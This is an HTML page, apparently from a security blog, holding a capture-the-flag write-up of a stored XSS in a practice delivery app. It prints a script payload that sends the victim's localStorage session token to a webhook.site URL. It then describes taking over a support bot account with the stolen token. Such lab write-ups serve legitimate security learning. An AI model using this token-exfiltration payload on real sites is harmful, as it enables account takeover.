@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml;utf8,<svg xmlns=%27http://www.w3.org/2000/svg%27 viewBox=%270 0 64 64%27><rect width=%2764%27 height=%2764%27 rx=%2712%27 fill=%27%2306080f%27/><path d=%27M16 18L30 32L16 46%27 stroke=%27%2300d9ff%27 stroke-width=%276%27 fill=%27none%27 stroke-linecap=%27round%27 stroke-linejoin=%27round%27/><rect x=%2734%27 y=%2742%27 width=%2716%27 height=%276%27 rx=%272%27 fill=%27%2300ff9d%27/></svg>">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <!-- EDIT: page title shown in browser tab -->
+    <title>Galaxy Dash (XSS) (Medium) // 7s26simon</title>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&amp;family=JetBrains+Mono:wght@400;500;600;700&amp;display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" type="text/css" href="../css/style.css">
+    <link rel="stylesheet" type="text/css" href="../css/style-writeup.css">
+</head>
+
+<body>
+
+    <!-- Imported from Medium: https://medium.com/@7s26simon/galaxy-dash-xss-medium-bugforge-dc1a104fab9c -->
+
+    <header id="top-bar-blue">
+        <h1 id="name-font">Simon McCabe</h1>
+        <p class="certs">OSCP &middot; OSWP &middot; PWPP &middot; PWPA &middot; PAPA &middot; EnCE &middot; Linux+ &middot; LPIC-1 &middot; Network+ &middot; Security+ &middot; Pentest+ &middot; eJPT &middot; eWPT &middot; BSc &middot; PGCert</p>
+    </header>
+
+    <nav class="topnav">
+        <a href="../index.html">home</a>
+        <div class="topnav-dropdown active">
+            <a href="#" class="topnav-dropdown-toggle" aria-haspopup="true">writeups</a>
+            <div class="topnav-dropdown-menu" role="menu">
+                <a href="../hackthebox.html">hackthebox</a>
+                <a href="../tryhackme.html">tryhackme</a>
+                <a href="../vulnhub.html">vulnhub</a>
+                <a class="active" href="../bugforge.html">bugforge</a>
+                <a href="../webverse.html">webverse</a>
+            </div>
+        </div>
+        <a href="../general.html">blog</a>
+        <a href="../quicklinks.html">quick links</a>
+        <a href="../About.html">about</a>
+    </nav>
+
+    <!-- ===== Title block ===== -->
+    <div id="writeup-box-name">
+        <p>Galaxy Dash (XSS) (Medium)</p>
+    </div>
+
+    <div id="marg-asthetic">
+
+<hr/><figure><img src="images/galaxy-dash-xss-medium/1*RzNr8fgj18fBDePMC8WlSA.png"/></figure><p>Step 1: Register</p><p>Register an account and you’ll land on the dashboard page:</p><figure><img src="images/galaxy-dash-xss-medium/1*UNHDIk-ZthhCD_Uiv4fByg.png"/></figure><p>Step 2: Deliveries</p><p>From here, you can set up a “New Delivery”. So…click “New Delivery”.</p><figure><img src="images/galaxy-dash-xss-medium/1*nfbykZygSzSKNiBqt1ORIw.png"/></figure><p>Step 3: Set up the route</p><p>From here, you can set the route (origin location) to the destination location.</p><figure><img src="images/galaxy-dash-xss-medium/1*3VCCovE_SHGDTIKHQI8EQw.png"/></figure><p>Select any other fields e.g Cargo Details and proxy your traffic. Then hit “Book Delivery”</p><figure><img src="images/galaxy-dash-xss-medium/1*xtnZD-PguTyihAb7gHujnA.png"/></figure><p>Step 4: POST</p><p>You’ll see a POST request to the /api/bookings endpoint. This POST req contains various fields. The one we’re interested in is called “cargo_size”. It’s currently set to medium (because that’s what I selected in the previous step). But we can change this.</p><figure><img src="images/galaxy-dash-xss-medium/1*DAYYzuUIEyn_vBDYys0w-g.png"/></figure><p>Step 5: XSS</p><p>Our session token is storage in localStorage, so we can use our alert to pop up with the ‘token’. Change the cargo_size to reflect this:</p><figure><img src="images/galaxy-dash-xss-medium/1*mXVnUW_9qP2gYqMaJ6F_Pg.png"/></figure><p>Step 6: Download Invoice</p><p>Now, in order to make the XSS trigger, we must hit “Download Invoice”.</p><figure><img src="images/galaxy-dash-xss-medium/1*geTOG7BgSVCT1yjoT8F6xQ.png"/></figure><p>As you can see in the screenshot, the XSS will trigger and contain our own ‘token’. But we want to use this to compromise another account.</p><figure><img src="images/galaxy-dash-xss-medium/1*AX_qL6jrV6mFqekd5eaCuA.png"/></figure><p>Step 7: Webhook</p><p>I used webhook.site as a temporary place for the token to be sent to, so that I can read the details of any other account that gets hit with the XSS.</p><p>So run through the process of setting up a new delivery, but this time, use the payload below (your webhook will obviously be unique):</p><pre class="code-view-two">&lt;script&gt;fetch('https://webhook.site/&lt;YOUR-WEBHOOK-ID&gt;?token='+encodeURIComponent(localStorage.getItem('token')))&lt;/script&gt;</pre><figure><img src="images/galaxy-dash-xss-medium/1*IAiyery5iLyjBe0CyFpUEQ.png"/></figure><p>Step 8: Request Support</p><p>Once you’ve done this, you’ll see a “Back to List” button. Click this:</p><figure><img src="images/galaxy-dash-xss-medium/1*HHZ8XuDGL5Ex0lFKjr9wfQ.png"/></figure><p>Click “Request Support” and you’ll see a pop up box appear:</p><figure><img src="images/galaxy-dash-xss-medium/1*SNxenupby2QLk3zvxmPjHg.png"/></figure><p>In the pop up box, select the delivery you just made, set it to “Invoice Review” and hit “Submit Request”:</p><figure><img src="images/galaxy-dash-xss-medium/1*IdxSQ0GV_T1bZ9rgfaLi3g.png"/></figure><p>Step 9: Wait</p><p>After around 60 seconds, you should see a hit to your webhook. The token should be visible at the bottom of the page:</p><figure><img src="images/galaxy-dash-xss-medium/1*bCRomJbHDIk-MZHpcEfGAA.png"/></figure><p>Step 10: Copy Token</p><p>Copy the token from webhook, open dev-tools and paste in your newly obtained token:</p><figure><img src="images/galaxy-dash-xss-medium/1*Fs7SWOzHPl76XfxnCfq8Gg.png"/></figure><p>Refresh the page and you’ll now see that you have become the “Support Bot” user account and the flag will appear in the response:</p><figure><img src="images/galaxy-dash-xss-medium/1*CS07PaegDxGGBTgrsMZijg.png"/></figure><p>Thanks for reading!</p>
+
+    </div>
+
+    <section id="social-media">
+        <a class="logoWidth" href="https://www.linkedin.com/in/simonmccabe1/" target="_blank" rel="noopener" aria-label="LinkedIn"><img src="../images/linkedin.PNG" alt="LinkedIn"></a>
+        <a class="logoWidth" href="https://x.com/7s26simon" target="_blank" rel="noopener" aria-label="X / Twitter"><img src="../images/twitter.PNG" alt="X"></a>
+        <a class="logoWidth" href="https://www.youtube.com/@7s26simon" target="_blank" rel="noopener" aria-label="YouTube"><img src="../images/youtube.PNG" alt="YouTube"></a>
+        <a class="logoWidth" href="https://github.com/7s26simon" target="_blank" rel="noopener" aria-label="GitHub"><img src="../images/linkedin.PNG" alt="GitHub"></a>
+    </section>
+
+    <footer id="bottom-bar">
+        <div id="validator">
+            <p id="footerTag">© 2026 Simon McCabe &middot; 7s26simon.github.io</p>
+        </div>
+    </footer>
+
+</body>
+</html>
